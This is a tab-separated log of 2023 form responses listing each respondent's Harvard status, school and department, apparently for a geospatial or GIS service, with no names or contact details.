Timestamp	Your Harvard status/appointment	Your primary affiliated school at Harvard	Your Harvard Department/Unit/Center/Program
2/8/2023 13:09:34	Graduate student: Doctorate	Harvard Business School (HBS)	Management
2/8/2023 16:38:37	Staff	Harvard Graduate School of Design (GSD)	GSD Library
2/10/2023 14:02:16	Graduate student: Masters	Harvard Graduate School of Design (GSD)	M.Arch I
2/13/2023 11:34:52	Undergraduate student	Harvard College	OEB, undergraduate
2/13/2023 13:14:16	Graduate student: Masters	Graduate School of Arts and Sciences (GSAS)	Regional Studies-East Asia
2/14/2023 21:43:34	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Department of Architecture
2/15/2023 11:31:26	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning
2/22/2023 11:19:26	Visitor	FAS Arts and Humanities Division	CBDB, IQSS
2/23/2023 16:40:50	Faculty	FAS Social Science Division	Davis Center for Russian and Eurasian Studies
2/28/2023 12:15:41	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	Mater in Public Policy
3/3/2023 17:51:35	Non-Harvard	Non-Harvard	Massachusetts General Hospital, Data Manager
3/6/2023 13:37:26	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Landscape Architecture
3/6/2023 13:56:55	Graduate student: Doctorate	Harvard School of Engineering and Applied Sciences (SEAS)	ESE
3/7/2023 1:16:29	Undergraduate student	Harvard College	Economics
3/7/2023 8:51:09	Staff	Harvard Business School (HBS)	Organizational Behavior
3/8/2023 13:40:19	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
3/9/2023 17:30:45	Visitor	FAS Social Science Division	Shanghai Jiao Tong University, associate professor
3/10/2023 10:08:52	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Political Economy and Government, Economics
3/10/2023 12:32:41	Non-Harvard	Non-Harvard	Universidad de Buenos Aires, Graduate Student
3/17/2023 11:39:29	Other Affliate	Non-Harvard	Mass General, Research Project Manager
3/18/2023 19:35:29	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MAUD
3/20/2023 10:07:29	Post doctoral research associate	Harvard School of Public Health (HSPH)	Global Health and Population (QuEST Center)
3/20/2023 15:12:06	Research fellow	Harvard Law School (HLS)	Animal Law and Policy Program
3/20/2023 22:09:03	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Master of Landscape Architecture
3/22/2023 12:30:01	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	MPAID
3/23/2023 10:18:02	Graduate student: Doctorate	Harvard Kennedy School of Government (HKS)	Public Policy
3/24/2023 13:04:26	Undergraduate student	Harvard College	Government, Tech Science Program
3/28/2023 12:43:49	Graduate student: Masters	Harvard Graduate School of Design (GSD)	GSD/MUP
4/5/2023 12:27:09	Post doctoral research associate	Harvard School of Public Health (HSPH)	Dept of Environmental Health
4/8/2023 15:38:45	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning and Design
4/10/2023 16:07:54	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
4/12/2023 10:19:36	Faculty	Harvard Medical School (HMS)	Pathology
4/12/2023 12:49:35	Research fellow	Harvard Kennedy School of Government (HKS)	Ash Center 
4/12/2023 12:58:55	Research fellow	Harvard Kennedy School of Government (HKS)	Ash Center 
4/12/2023 13:01:23	Research fellow	Harvard Kennedy School of Government (HKS)	Ash Center 
4/13/2023 11:05:50	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MAUD
4/13/2023 12:29:38	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MAUD
4/14/2023 10:05:05	Graduate student: Masters	Harvard Divinity School (HDS)	HDS, Masters of Theological Studies student
4/14/2023 10:36:20	Faculty	FAS Social Science Division	Department of Government
4/14/2023 18:24:45	Graduate student: Masters	Graduate School of Arts and Sciences (GSAS)	RSEA
4/17/2023 10:18:17	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Economics
4/17/2023 13:21:38	Other Affliate	Harvard Medical School (HMS)	HMS/Beth Israel Deaconess Medical Center
4/18/2023 18:17:19	Faculty	Harvard Business School (HBS)	Accounting Unit
4/20/2023 15:12:39	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning and Design // Master in Urban Planning
4/24/2023 14:41:58	Staff	Harvard Medical School (HMS)	Brigham and Women's Department of Rheumatology
4/25/2023 9:17:54	Non-degree student	FAS Social Science Division	Economics
4/25/2023 10:30:56	Staff	Harvard Graduate School of Education (GSE)	Saul Zaentz Early Education Initiative
4/25/2023 22:37:24	Other Affliate	Harvard Law School (HLS)	Program in Islamic Law
4/26/2023 10:47:07	Post doctoral research associate	Harvard School of Public Health (HSPH)	Dept of Environmental Health
4/27/2023 12:36:03	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Master in Urban Planning
5/2/2023 19:22:53	Non-Harvard	Non-Harvard	George Washington University (contractor)
5/3/2023 19:44:21	Non-Harvard	Non-Harvard	Town Planner 
5/9/2023 7:52:11	Staff	Harvard Graduate School of Education (GSE)	Zaentz Early Education Initiative
5/10/2023 16:32:09	Faculty	FAS Science Division	Human Evolutionary Biology
5/11/2023 14:09:19	Non-Harvard	FAS Science Division	Statistics 
5/15/2023 10:10:54	Staff	FAS Arts and Humanities Division	Peabody Museum Archives 
5/15/2023 10:58:31	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Health Policy
5/18/2023 12:36:09	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Master of Landscape Architecture in Urban Design
5/22/2023 23:07:05	Faculty	Harvard School of Public Health (HSPH)	Environmental Health Department
5/24/2023 13:11:48	Staff	FAS Science Division	OEB
5/25/2023 13:08:57	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Organismic & Evolutionary Biology
5/30/2023 13:22:00	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Population Health Sciences 
6/1/2023 16:48:22	Research assistant	FAS Science Division	Harvard Forest
6/5/2023 11:43:03	Research assistant	FAS Science Division	Harvard Forest
6/7/2023 15:32:17	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	History Department, GIS Summer Institute
6/8/2023 13:46:00	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	History, GIS Summer Institute
6/8/2023 14:05:54	Staff	Harvard Law School (HLS)	HLS Faculty Support Services; the Program in Islamic Law
6/12/2023 16:43:48	Post doctoral research associate	Harvard School of Public Health (HSPH)	Dept of Environmental Health
6/15/2023 21:13:04	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Landscape Architecture
6/16/2023 9:59:50	Staff	Harvard Law School (HLS)	GIS Summer Institute 
6/19/2023 23:14:35	Non-Harvard	Non-Harvard	Center for Geographical Analysis
6/21/2023 11:50:39	Faculty	Harvard Graduate School of Design (GSD)	MAUD
6/22/2023 17:28:15	Faculty	Harvard Graduate School of Design (GSD)	Dept of Landscape Architecture
6/24/2023 17:27:35	Graduate student: Doctorate	Harvard Graduate School of Design (GSD)	I am currently a PhD student in Geography at Hassan II University in Casablanca, Faculty of Arts and Humanities in Mohammedia. I am affiliated with the Laboratory of Coastal Environment, Natural Heritage, Urban Planning, Logistics, and Tourism.
6/26/2023 14:44:55	Faculty	Harvard Graduate School of Design (GSD)	Urban Planning
6/27/2023 10:18:51	Non-degree student	Graduate School of Arts and Sciences (GSAS)	Economics
6/27/2023 18:24:50	Faculty	Harvard Graduate School of Design (GSD)	GSD Dept. of Landscape Architecture
6/28/2023 10:24:25	Non-Harvard	Harvard Medical School (HMS)	Research Assistant - Massachusetts General Hospital
6/28/2023 18:02:02	Non-Harvard	Non-Harvard	William & Mary, Undergraduate BS Data Science, Spatial Data Analytics
6/29/2023 9:58:26	Non-Harvard	FAS other units	Book Editor for upcoming book to be published by Taylor and Francis
7/5/2023 9:39:22	Faculty	Harvard Graduate School of Design (GSD)	Landscape Architecture
7/6/2023 9:53:16	Faculty	Harvard Medical School (HMS)	Brigham and Women's Hospital; Harvard Humanitarian Initiative
7/11/2023 12:30:23	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning
7/20/2023 14:01:14	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Pre-College Summer School 
7/26/2023 12:37:03	Research assistant	FAS other units	Harvard Forest
7/26/2023 19:38:05	Graduate student: Doctorate	Harvard School of Engineering and Applied Sciences (SEAS)	Environmental Science & Engineering
7/27/2023 11:35:21	Staff	Harvard School of Public Health (HSPH)	Dept of Environmental Health
7/27/2023 14:26:11	Staff	Harvard Business School (HBS)	Baker Library
7/27/2023 15:50:15	Non-Harvard	Non-Harvard	Ministry of Foreign Affairs, Republic of Korea
